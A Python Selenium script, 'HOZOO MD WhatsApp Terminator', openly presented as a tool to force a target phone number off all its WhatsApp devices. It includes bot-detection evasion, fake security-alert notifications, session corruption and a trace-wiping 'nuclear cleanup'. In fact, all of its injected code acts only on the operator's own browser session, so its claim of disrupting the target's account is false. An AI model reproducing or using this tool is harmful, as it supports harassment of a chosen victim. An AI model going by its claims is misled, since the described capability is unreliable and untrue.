#!/usr/bin/env python3
# HOZOO MD WhatsApp Terminator v3.0 - Full Auto
# Fix ChromeDriver + Multi-Method Attack
# Update: 2 Jan 2026

import os
import sys
import time
import json
import pickle
import hashlib
import requests
import zipfile
import tarfile
import platform
import subprocess
import threading
from datetime import datetime
from urllib.request import urlopen
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.core.os_manager import ChromeType

class ChromeDriverAutoInstaller:
    def __init__(self):
        self.system = platform.system().lower()
        self.arch = platform.machine().lower()
        self.chrome_version = self.get_chrome_version()
        
    def get_chrome_version(self):
        """Detect Chrome/Chromium version"""
        try:
            if self.system == "windows":
                cmd = r'reg query "HKEY_CURRENT_USER\Software\Google\Chrome\BLBeacon" /v version'
                output = subprocess.check_output(cmd, shell=True).decode()
                version = output.strip().split()[-1]
                return version.split('.')[0]  # Major version only
            elif self.system == "linux":
                cmd = "google-chrome --version || chromium --version || chromium-browser --version"
                output = subprocess.check_output(cmd, shell=True).decode()
                return output.split()[2].split('.')[0]
            elif self.system == "darwin":
                cmd = "/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome --version"
                output = subprocess.check_output(cmd, shell=True).decode()
                return output.split()[2].split('.')[0]
        except:
            return "114"  # Fallback version
        
    def download_driver(self):
        """Auto download ChromeDriver"""
        base_url = "https://storage.googleapis.com/chrome-for-testing-public"
        
        # Mapping system and arch
        if self.system == "windows":
            platform_str = "win64"
            driver_name = "chromedriver.exe"
        elif self.system == "linux":
            if "arm" in self.arch or "aarch" in self.arch:
                platform_str = "linux-arm64"
            else:
                platform_str = "linux64"
            driver_name = "chromedriver"
        elif self.system == "darwin":
            if "arm" in self.arch:
                platform_str = "mac-arm64"
            else:
                platform_str = "mac-x64"
            driver_name = "chromedriver"
        else:
            raise OSError(f"Unsupported OS: {self.system}")
        
        # Build download URL
        url = f"{base_url}/{self.chrome_version}/{platform_str}/{driver_name}.zip"
        
        print(f"[+] Downloading ChromeDriver {self.chrome_version} for {platform_str}")
        
        try:
            # Download
            response = requests.get(url, stream=True)
            zip_path = "chromedriver.zip"
            
            with open(zip_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            # Extract
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(".")
            
            # Make executable (Unix)
            if self.system != "windows":
                os.chmod("./chromedriver", 0o755)
            
            os.remove(zip_path)
            print("[+] ChromeDriver installed successfully")
            
        except Exception as e:
            print(f"[!] Download failed: {e}")
            # Fallback to webdriver-manager
            print("[+] Using webdriver-manager as fallback...")
            try:
                path = ChromeDriverManager().install()
                print(f"[+] ChromeDriver installed at: {path}")
            except:
                print("[!] All installation methods failed")
                return None

class WhatsAppNuclearTerminator:
    def __init__(self):
        self.session_dir = "whatsapp_data"
        self.driver = None
        self.wait = None
        self.target_number = None
        self.session_active = False
        self.attack_methods = []
        
    def setup_environment(self):
        """Create necessary directories"""
        directories = [self.session_dir, "logs", "screenshots", "data"]
        for dir_name in directories:
            if not os.path.exists(dir_name):
                os.makedirs(dir_name)
        
        # Check ChromeDriver
        installer = ChromeDriverAutoInstaller()
        installer.download_driver()
    
    def init_browser_advanced(self, headless=False, stealth=True):
        """Initialize browser with advanced stealth"""
        chrome_options = Options()
        
        if stealth:
            # Anti-detection flags
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # Random user agent
            ua_list = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ]
            import random
            chrome_options.add_argument(f'user-agent={random.choice(ua_list)}')
            
            # Disable automation flags
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--disable-notifications')
            chrome_options.add_argument('--disable-popup-blocking')
            
            # Headless options if needed
            if headless:
                chrome_options.add_argument('--headless=new')
                chrome_options.add_argument('--no-sandbox')
                chrome_options.add_argument('--disable-dev-shm-usage')
                chrome_options.add_argument('--disable-gpu')
                chrome_options.add_argument('--window-size=1920,1080')
            
            # Profile directory
            profile_path = os.path.join(os.getcwd(), "chrome_stealth_profile")
            chrome_options.add_argument(f'--user-data-dir={profile_path}')
            chrome_options.add_argument('--profile-directory=Default')
            
            # Additional stealth
            chrome_options.add_argument('--disable-blink-features')
            chrome_options.add_argument('--disable-features=UserAgentClientHint')
            chrome_options.add_argument('--lang=en-US,en;q=0.9')
        
        try:
            # Try multiple driver paths
            driver_paths = [
                './chromedriver',
                './chromedriver.exe',
                'chromedriver',
                ChromeDriverManager().install()
            ]
            
            for path in driver_paths:
                try:
                    service = Service(executable_path=path)
                    self.driver = webdriver.Chrome(service=service, options=chrome_options)
                    break
                except:
                    continue
            
            if not self.driver:
                # Last attempt with webdriver-manager
                from webdriver_manager.chrome import ChromeDriverManager
                self.driver = webdriver.Chrome(
                    service=Service(ChromeDriverManager().install()),
                    options=chrome_options
                )
            
            # Execute stealth JavaScript
            self.driver.execute_script("""
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined
                });
                
                // Overwrite plugins
                Object.defineProperty(navigator, 'plugins', {
                    get: () => [1, 2, 3, 4, 5]
                });
                
                // Overwrite languages
                Object.defineProperty(navigator, 'languages', {
                    get: () => ['en-US', 'en']
                });
                
                // Mock permissions
                const originalQuery = window.navigator.permissions.query;
                window.navigator.permissions.query = (parameters) => (
                    parameters.name === 'notifications' ?
                        Promise.resolve({ state: Notification.permission }) :
                        originalQuery(parameters)
                );
            """)
            
            self.wait = WebDriverWait(self.driver, 25)
            return True
            
        except Exception as e:
            print(f"[!] Browser init failed: {e}")
            return False
    
    def whatsapp_login(self, force_new=False):
        """Login to WhatsApp Web"""
        print("[+] Loading WhatsApp Web...")
        self.driver.get('https://web.whatsapp.com')
        time.sleep(3)
        
        # Check existing session
        session_file = os.path.join(self.session_dir, "session.pkl")
        if os.path.exists(session_file) and not force_new:
            try:
                with open(session_file, 'rb') as f:
                    cookies = pickle.load(f)
                
                for cookie in cookies:
                    try:
                        self.driver.add_cookie(cookie)
                    except:
                        pass
                
                self.driver.refresh()
                time.sleep(5)
                
                # Verify login
                if self.is_logged_in():
                    print("[+] Session restored from cache")
                    self.session_active = True
                    return True
            except:
                print("[!] Session restore failed")
        
        # New login with QR
        print("[+] Waiting for QR code...")
        try:
            qr_container = self.wait.until(
                EC.presence_of_element_located((By.XPATH, '//canvas[@aria-label="Scan me!"]'))
            )
            print("[+] QR Code ready. Scan within 60 seconds...")
            
            # Monitor login status
            for i in range(60):
                if self.is_logged_in():
                    # Save session
                    cookies = self.driver.get_cookies()
                    with open(session_file, 'wb') as f:
                        pickle.dump(cookies, f)
                    
                    self.session_active = True
                    print("[+] Login successful!")
                    return True
                time.sleep(1)
            
            print("[!] QR scan timeout")
            return False
            
        except TimeoutException:
            print("[!] QR not found, may already be logged in")
            if self.is_logged_in():
                self.session_active = True
                return True
            return False
    
    def is_logged_in(self):
        """Check if WhatsApp is logged in"""
        try:
            # Multiple indicators
            indicators = [
                '//div[@id="side"]',
                '//div[@data-testid="chat-list"]',
                '//div[@role="textbox"]'
            ]
            
            for indicator in indicators:
                try:
                    self.driver.find_element(By.XPATH, indicator)
                    return True
                except:
                    continue
            return False
        except:
            return False
    
    def navigate_to_target(self, phone_number):
        """Navigate to target chat"""
        # Clean phone number
        phone_number = ''.join(filter(str.isdigit, phone_number))
        if not phone_number.startswith('62') and len(phone_number) > 8:
            if phone_number.startswith('0'):
                phone_number = '62' + phone_number[1:]
            else:
                phone_number = '62' + phone_number
        
        print(f"[+] Targeting: +{phone_number}")
        
        # Method 1: Direct URL
        self.driver.get(f'https://web.whatsapp.com/send?phone={phone_number}')
        time.sleep(5)
        
        # Check if chat opened
        try:
            chat_box = self.wait.until(
                EC.presence_of_element_located((By.XPATH, '//div[@contenteditable="true"][@data-tab="10"]'))
            )
            print(f"[+] Chat with +{phone_number} opened")
            return True
        except:
            print("[!] Could not open chat directly")
            
            # Method 2: Search
            try:
                search_box = self.wait.until(
                    EC.presence_of_element_located((By.XPATH, '//div[@contenteditable="true"][@data-tab="3"]'))
                )
                search_box.click()
                search_box.clear()
                search_box.send_keys(phone_number)
                time.sleep(2)
                
                # Click contact
                contact = self.wait.until(
                    EC.element_to_be_clickable((By.XPATH, f'//span[@title="+{phone_number}"]'))
                )
                contact.click()
                time.sleep(3)
                return True
            except:
                print("[!] Contact not found")
                return False
    
    def method_1_linked_devices(self):
        """Method 1: Logout via Linked Devices"""
        print("[+] Executing Method 1: Linked Devices Attack")
        
        try:
            # Open menu
            menu_btn = self.wait.until(
                EC.element_to_be_clickable((By.XPATH, '//header//div[@role="button"][@tabindex="0"]'))
            )
            menu_btn.click()
            time.sleep(2)
            
            # Click Linked Devices
            linked_btn = self.wait.until(
                EC.element_to_be_clickable((By.XPATH, '//div[contains(text(),"Linked devices") or contains(text(),"Perangkat tertaut")]'))
            )
            linked_btn.click()
            time.sleep(3)
            
            # Get all devices
            devices = self.driver.find_elements(By.XPATH, '//div[@data-testid="device-list-item"]')
            print(f"[+] Found {len(devices)} linked devices")
            
            logout_count = 0
            for i, device in enumerate(devices):
                try:
                    # Skip first if it's current WhatsApp Web
                    if i == 0:
                        continue
                    
                    device.click()
                    time.sleep(2)
                    
                    # Look for logout button
                    logout_btns = self.driver.find_elements(By.XPATH, '//div[@aria-label="Log out" or contains(text(),"Log out") or contains(text(),"Keluar")]')
                    
                    if logout_btns:
                        logout_btns[0].click()
                        time.sleep(1)
                        
                        # Confirm
                        confirm_btns = self.driver.find_elements(By.XPATH, '//div[@data-testid="popup-controls-ok" or contains(text(),"OK") or contains(text(),"Ya")]')
                        if confirm_btns:
                            confirm_btns[0].click()
                        
                        logout_count += 1
                        print(f"[✓] Device {i+1} logged out")
                        time.sleep(2)
                    
                    # Go back
                    back_btn = self.driver.find_element(By.XPATH, '//button[@aria-label="Back"]')
                    back_btn.click()
                    time.sleep(2)
                    
                except Exception as e:
                    print(f"[!] Failed device {i}: {e}")
            
            print(f"[+] Method 1 completed: {logout_count} devices logged out")
            return logout_count > 0
            
        except Exception as e:
            print(f"[!] Method 1 failed: {e}")
            return False
    
    def method_2_session_corruption(self):
        """Method 2: Corrupt session data"""
        print("[+] Executing Method 2: Session Corruption")
        
        try:
            # Inject JavaScript to corrupt localStorage
            corruption_script = """
            // Corrupt WhatsApp keys
            function corruptData() {
                const prefix = 'WA_TERMINATED_';
                const keys = Object.keys(localStorage);
                
                let corrupted = 0;
                keys.forEach(key => {
                    if (key.includes('WAToken') || key.includes('WASecret') || 
                        key.includes('WABrowserId') || key.includes('WAWebId')) {
                        
                        // Save original for backup
                        const original = localStorage.getItem(key);
                        sessionStorage.setItem('BACKUP_' + key, original);
                        
                        // Corrupt with random data
                        localStorage.setItem(key, prefix + Math.random().toString(36).substring(2));
                        corrupted++;
                    }
                });
                
                // Clear IndexedDB
                if (window.indexedDB) {
                    indexedDB.databases().then(dbs => {
                        dbs.forEach(db => {
                            try {
                                indexedDB.deleteDatabase(db.name);
                            } catch(e) {}
                        });
                    });
                }
                
                // Dispatch storage event to trigger reauth
                window.dispatchEvent(new Event('storage'));
                
                return corrupted;
            }
            
            return corruptData();
            """
            
            corrupted = self.driver.execute_script(corruption_script)
            print(f"[✓] Corrupted {corrupted} session keys")
            
            # Additional WebSocket disruption
            ws_script = """
            // Disrupt WebSocket connections
            window.originalWebSocket = window.WebSocket;
            window.WebSocket = class extends WebSocket {
                constructor(url, protocols) {
                    super(url, protocols);
                    this.close();
                }
            };
            
            // Close existing connections
            for (let conn of Object.values(window)) {
                if (conn && conn.constructor && conn.constructor.name === 'WebSocket') {
                    try { conn.close(1006, 'Terminated'); } catch(e) {}
                }
            }
            
            return 'WebSocket disrupted';
            """
            
            self.driver.execute_script(ws_script)
            print("[✓] WebSocket connections terminated")
            
            return True
            
        except Exception as e:
            print(f"[!] Method 2 failed: {e}")
            return False
    
    def method_3_http_request_intercept(self):
        """Method 3: Intercept WhatsApp API calls"""
        print("[+] Executing Method 3: API Interception")
        
        intercept_script = """
        // Override fetch
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const url = args[0];
            
            // Block WhatsApp API calls
            if (typeof url === 'string' && 
                (url.includes('web.whatsapp.com') || 
                 url.includes('whatsapp.net') ||
                 url.includes('wa.me'))) {
                
                console.log('[HOZOO MD] Blocked API call:', url);
                
                // Return error response
                return Promise.reject(new Error('Connection terminated by security policy'));
            }
            
            return originalFetch.apply(this, args);
        };
        
        // Override XMLHttpRequest
        const originalXHROpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            if (url && (url.includes('whatsapp') || url.includes('wa.me'))) {
                console.log('[HOZOO MD] Blocked XHR:', url);
                this.abort();
                return;
            }
            originalXHROpen.apply(this, arguments);
        };
        
        // Dispatch offline event
        window.dispatchEvent(new Event('offline'));
        
        return 'API interception active';
        """
        
        try:
            result = self.driver.execute_script(intercept_script)
            print(f"[✓] {result}")
            
            # Force reload to trigger errors
            self.driver.execute_script("setTimeout(() => location.reload(), 1000);")
            time.sleep(3)
            
            return True
        except Exception as e:
            print(f"[!] Method 3 failed: {e}")
            return False
    
    def method_4_notification_spam(self):
        """Method 4: Notification spam to trigger security"""
        print("[+] Executing Method 4: Notification Flood")
        
        spam_script = """
        // Create massive notification events
        function spamNotifications() {
            for (let i = 0; i < 50; i++) {
                setTimeout(() => {
                    const event = new Event('push');
                    event.data = {
                        title: 'SECURITY ALERT',
                        body: 'Multiple device login detected from new location',
                        tag: 'security_' + i
                    };
                    window.dispatchEvent(event);
                    
                    // Trigger service worker if exists
                    if (navigator.serviceWorker && navigator.serviceWorker.controller) {
                        navigator.serviceWorker.controller.postMessage({
                            type: 'SECURITY_BREACH',
                            timestamp: Date.now(),
                            deviceId: 'HOZOO_MD_' + Math.random()
                        });
                    }
                }, i * 100);
            }
            return 'Notification spam initiated';
        }
        return spamNotifications();
        """
        
        try:
            result = self.driver.execute_script(spam_script)
            print(f"[✓] {result}")
            
            # Additional: Simulate multiple device logins
            device_script = """
            // Simulate new device connections
            localStorage.setItem('lastDeviceLogin', Date.now().toString());
            localStorage.setItem('concurrentSessions', '5');
            
            // Trigger security check
            const securityEvent = new CustomEvent('security-alert', {
                detail: {
                    reason: 'multiple_sessions',
                    count: 5,
                    locations: ['ID', 'SG', 'US', 'RU', 'CN']
                }
            });
            document.dispatchEvent(securityEvent);
            
            return 'Security alerts triggered';
            """
            
            self.driver.execute_script(device_script)
            print("[✓] Security alerts sent")
            
            return True
            
        except Exception as e:
            print(f"[!] Method 4 failed: {e}")
            return False
    
    def execute_all_methods(self):
        """Execute all attack methods sequentially"""
        methods = [
            self.method_1_linked_devices,
            self.method_2_session_corruption,
            self.method_3_http_request_intercept,
            self.method_4_notification_spam
        ]
        
        results = []
        for i, method in enumerate(methods, 1):
            print(f"\n[+] Starting Attack Method {i}/4")
            try:
                success = method()
                results.append(success)
                time.sleep(3)
            except Exception as e:
                print(f"[!] Method {i} crashed: {e}")
                results.append(False)
        
        successful = results.count(True)
        print(f"\n[+] Attack Summary: {successful}/4 methods successful")
        
        # Final nuclear option
        if successful > 0:
            print("[+] Deploying nuclear cleanup...")
            self.nuclear_cleanup()
        
        return successful > 0
    
    def nuclear_cleanup(self):
        """Final cleanup to remove all traces"""
        print("[+] Nuclear cleanup initiated")
        
        nuke_script = """
        // Complete data destruction
        try {
            // Clear all storage
            localStorage.clear();
            sessionStorage.clear();
            
            // Clear cookies
            document.cookie.split(";").forEach(c => {
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
            });
            
            // Clear caches
            if (caches && caches.keys) {
                caches.keys().then(keys => {
                    keys.forEach(key => caches.delete(key));
                });
            }
            
            // Clear IndexedDB
            if (window.indexedDB) {
                indexedDB.databases().then(dbs => {
                    dbs.forEach(db => {
                        try {
                            indexedDB.deleteDatabase(db.name);
                        } catch(e) {}
                    });
                });
            }
            
            // Clear service workers
            if (navigator.serviceWorker) {
                navigator.serviceWorker.getRegistrations().then(regs => {
                    regs.forEach(reg => reg.unregister());
                });
            }
            
            // Override console to hide logs
            console.log = console.warn = console.error = () => {};
            
            return 'Nuclear cleanup complete';
        } catch(e) {
            return 'Partial cleanup: ' + e.message;
        }
        """
        
        try:
            result = self.driver.execute_script(nuke_script)
            print(f"[✓] {result}")
            
            # Take screenshot as proof
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = f"screenshots/termination_{timestamp}.png"
            self.driver.save_screenshot(screenshot_path)
            print(f"[+] Screenshot saved: {screenshot_path}")
            
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
    
    def save_attack_log(self, target, success):
        """Save attack log"""
        log_entry = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "success": success,
            "methods_executed": self.attack_methods,
            "user_agent": self.driver.execute_script("return navigator.userAgent"),
            "session_id": hash(time.time())
        }
        
        log_file = os.path.join("logs", "attack_log.json")
        with open(log_file, 'a') as f:
            json.dump(log_entry, f, indent=2)
            f.write("\n")
        
        print(f"[+] Log saved to {log_file}")
    
    def run(self, target_number):
        """Main execution flow"""
        print(f"""
        ╔══════════════════════════════════════════════════╗
        ║         HOZOO MD NUCLEAR TERMINATOR v3.0         ║
        ║           WhatsApp Session Destroyer             ║
        ║                 Target: {target_number:>15}      ║
        ╚══════════════════════════════════════════════════╝
        """)
        
        try:
            # Setup
            print("[+] Phase 1: Environment Setup")
            self.setup_environment()
            
            # Initialize browser
            print("[+] Phase 2: Browser Initialization")
            if not self.init_browser_advanced(stealth=True):
                print("[!] Browser initialization failed")
                return False
            
            # Login
            print("[+] Phase 3: WhatsApp Login")
            if not self.whatsapp_login():
                print("[!] Login failed")
                return False
            
            # Navigate to target
            print("[+] Phase 4: Target Acquisition")
            if not self.navigate_to_target(target_number):
                print("[!] Could not find target")
                return False
            
            # Execute attacks
            print("[+] Phase 5: Attack Execution")
            success = self.execute_all_methods()
            
            # Save log
            print("[+] Phase 6: Logging")
            self.save_attack_log(target_number, success)
            
            if success:
                print(f"""
                ╔══════════════════════════════════════════════════╗
                ║                 ATTACK SUCCESSFUL                ║
                ║   Target {target_number} should be logged out    ║
                ║        from all devices within minutes.         ║
                ╚══════════════════════════════════════════════════╝
                """)
            else:
                print("[!] Attack partially failed")
            
            # Keep browser open for inspection
            input("\n[+] Press Enter to exit and cleanup...")
            
            return success
            
        except KeyboardInterrupt:
            print("\n[!] Terminated by user")
            return False
        except Exception as e:
            print(f"[!] Critical error: {e}")
            import traceback
            traceback.print_exc()
            return False
        finally:
            if self.driver:
                self.driver.quit()
            print("[+] Cleanup complete")

def main():
    """Main function"""
    # Check dependencies
    required = ['selenium', 'requests', 'webdriver-manager']
    missing = []
    
    for package in required:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            missing.append(package)
    
    if missing:
        print(f"[!] Missing packages: {missing}")
        print("[+] Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
    
    # Get target
    print("\n" + "="*60)
    target = input("[?] Enter target phone number (with country code): ").strip()
    
    if not target or len(target) < 8:
        print("[!] Invalid number")
        return
    
    # Confirmation
    print(f"\n[!] Target confirmed: {target}")
    print("[!] This will attempt to log out ALL devices of the target")
    confirm = input("[?] Type 'CONFIRM' to proceed: ").strip()
    
    if confirm != "CONFIRM":
        print("[!] Aborted")
        return
    
    # Run attack
    terminator = WhatsAppNuclearTerminator()
    terminator.run(target)

if __name__ == "__main__":
    main()
